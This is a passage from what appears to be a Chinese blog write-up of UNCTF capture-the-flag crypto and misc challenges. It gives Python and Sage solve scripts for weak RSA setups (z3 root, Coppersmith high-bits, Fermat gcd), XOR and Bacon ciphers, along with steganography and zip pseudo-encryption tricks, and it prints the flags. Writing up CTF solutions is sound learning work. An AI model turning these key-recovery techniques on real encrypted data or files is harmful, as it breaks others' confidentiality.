<span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;t&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;c&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;n&#x27;</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;u&#x27;</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    what = guess.pop(<span class="number">50</span>)</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span>.join(j <span class="keyword">for</span> j <span class="keyword">in</span> what)</span><br><span class="line">    mask = strxor(<span class="number">5</span>*name.encode(),key1)</span><br><span class="line"><span class="comment"># 虽然计算了四轮，但最终用于使用的串只有最后一轮</span></span><br><span class="line"><span class="built_in">print</span>(mask)</span><br><span class="line">n4 = <span class="string">&#x27;7\x1a\x02\x15\x17&lt;\x1c\x15+:\x0b\x00\x14\x07\n\x02\x0c9&quot;1\x0e\x109A^&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    flag[i] ^= <span class="built_in">ord</span>(n4[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># UNCTF&#123;1_l0ve_Thurs4Ay!!!&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="ezRSA-广东海洋大学"><a href="#ezRSA-广东海洋大学" class="headerlink" title="ezRSA-广东海洋大学"></a>ezRSA-广东海洋大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`z3求解`，`rsa基础流程</span><br></pre></td></tr></table></figure><ul><li><p>非常规rsa公私钥制作，反而变简单了</p></li><li><p>第一眼 p^4 &#x3D; n，z3直接求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">p = Real(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(p**<span class="number">4</span> == <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span>)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure></li><li><p>cdn正常解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">p = <span class="number">89065756791595323358603857939783936930073695697065732353414009005162022399741</span></span><br><span class="line">phi = p**<span class="number">4</span> - p**<span class="number">3</span></span><br><span class="line">d = libnum.invmod(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="babyRSA-广东海洋大学"><a href="#babyRSA-广东海洋大学" class="headerlink" title="babyRSA-广东海洋大学"></a>babyRSA-广东海洋大学</h3><ul><li><p>明文高位攻击，直接sage脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">high_m = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">m = high_m + x</span><br><span class="line">M = m((m^<span class="number">6</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(M))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure></li><li><p>然后把M转一下。。。。。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">x =<span class="number">0x554e4354467b32376130616163372d373663622d343237642d393132392d3134373633363064356431627d</span></span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(x))</span><br><span class="line"><span class="comment"># UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="今晚吃什么-金陵科技学院"><a href="#今晚吃什么-金陵科技学院" class="headerlink" title="今晚吃什么-金陵科技学院"></a>今晚吃什么-金陵科技学院</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`培根密码</span><br></pre></td></tr></table></figure><ul><li><p>10000和00000串，5位，结合题目今晚吃什么，估计是培根密码</p></li><li><p>提取每个串的首位构成新串，写脚本替换为培根密码格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lis = [<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;00000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;10000&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;A&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;B&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> cnt % <span class="number">5</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;/&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="comment"># AAABA/BAAAA/BABBA/ABBBA/BAAAA/ABBAB/ABAAA/BAAAB/AABAB/BAABB/ABBAA</span></span><br></pre></td></tr></table></figure></li><li><p>去网站解密得到flag</p><blockquote><p>UNCTF{CRYPROISFUN}</p></blockquote></li></ul><h3 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h3><ul><li><p>费马小定理： 如果p是一个质数，而整数a不是p的倍数，则有a(p-1)≡1（mod p）</p></li><li><p>推导</p><ul><li>gift+x &#x3D; xp</li><li>gift &#x3D; (p-1)*x</li><li>2x*(p-1) ≡ 1(mod p)</li><li>2x*(p-1) - 1 &#x3D; x * p</li><li>2gift -1 &#x3D; x*p</li><li>结合n &#x3D; p*q</li><li>p &#x3D; gcd(n, 2gift -1)</li><li>p &#x3D; gcd(n, powmod(2, gift, n))</li></ul></li><li><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n =  <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">gift = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line"></span><br><span class="line">gift = <span class="built_in">pow</span>(<span class="number">2</span>,gift,n) - <span class="number">1</span></span><br><span class="line">p = libnum.gcd(gift,n)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;DO_y0u_Fermat_1ittle_theOrem&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><code>Misc</code></h2><h3 id="magic-word-西南科技大学"><a href="#magic-word-西南科技大学" class="headerlink" title="magic_word-西南科技大学"></a>magic_word-西南科技大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`零宽隐写</span><br></pre></td></tr></table></figure><ul><li>提示明显，零宽隐写，文档cv到<a href="http://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters (330k.github.io)</a></li><li>解密就完事了</li></ul><blockquote><p>unctf{We1come_new_ctfer}</p></blockquote><ul><li>一开始没改大写WA了一发，血亏</li></ul><h3 id="巨鱼-河南理工大学"><a href="#巨鱼-河南理工大学" class="headerlink" title="巨鱼-河南理工大学"></a>巨鱼-河南理工大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点`：`图片大小隐写`，`zip伪加密`，`文件合成`，`ppt隐写</span><br></pre></td></tr></table></figure><ul><li><p>拿到图片先常规检查，改了改宽高，发现多出一行字“无所谓我会出手”，可能有用</p></li><li><p>然后kali试着foremost了一下，发现图片隐藏了zip，提取出来打开</p></li><li><p>010查看zip，真加密，拿刚才找出来的字试了一下，密码正确</p></li><li><p>提取出来又是一层zip，还是有加密，010打开一眼看到总标志位0000，伪加密</p></li><li><p>翻看标志位unshortdeflag，为1的全改回0，去伪加密</p></li><li><p>一个flag文件夹，一个化学式和一个加密的pptx，网上查了化学式名字都不对，发现叫六六粉，试了666，正确，出题人真6</p></li><li><p>打开pptx，提示flagnothere，最后一页pptx无内容，猜测同色隐藏到背景里了，全选更换字体颜色，得到flag</p><blockquote><p>UNCTF{y0u_F1nd_1t!}</p></blockquote></li><li><p>这题多写几个字以表敬意（</p></li></ul><h3 id="syslog-浙江师范大学"><a href="#syslog-浙江师范大学" class="headerlink" title="syslog-浙江师范大学"></a>syslog-浙江师范大学</h3><ul><li><p>提示看压缩包，结合题目的syslog</p></li><li><p>上kali，binwalk -e文件，打开日志查看</p></li><li><p>搜索password发现base64</p></li><li><pre><code>cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA==<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 解密得到密码</span><br><span class="line"></span><br><span class="line">- 输入得到flag</span><br><span class="line"></span><br><span class="line">  &gt; unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</span><br><span class="line"></span><br><span class="line">### 找得到我吗-闽南师范大学</span><br><span class="line"></span><br><span class="line">- 打开文档全选设定文字颜色，发现3k字大作文，但是好像没用，废话文学是玩明白了</span><br><span class="line"></span><br><span class="line">- 常规检测，binwalk分离转出xml</span><br><span class="line"></span><br><span class="line">- 一大堆东西挨个看</span><br><span class="line"></span><br><span class="line">- document.xml中搜索flag得到结果</span><br><span class="line"></span><br><span class="line">- &gt; UNCTF&#123;You_find_me!&#125;</span><br><span class="line"></span><br><span class="line">### 社什么社-湖南警察学院</span><br><span class="line"></span><br><span class="line">- 凤凰古城不错，以后一定去看看</span><br><span class="line"></span><br><span class="line">- &gt; UNCTF&#123;4F0198127A45F66C07A5B1A2DDA8223C&#125;</span><br><span class="line"></span><br><span class="line">### In_the_Morse_Garden-陆军工程大学</span><br><span class="line"></span><br></pre></td></tr></table></figure>知识点`：`base64`，`word隐写`，`摩斯密码</code></pre></li></ul><pre><code>- pdf打开，ctrl+A发现图片下面有东西，提取出来- UNCTF&#123;….=&#125;，base64解密- 花园宝宝乱入- 只有玛卡巴卡和依古比古，加上题目，morse解密（空格是摩斯断点，因为这个卡了半天，服了）- &gt; UNCTF&#123;WAN_AN_MAKA_BAKAAAAA!&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
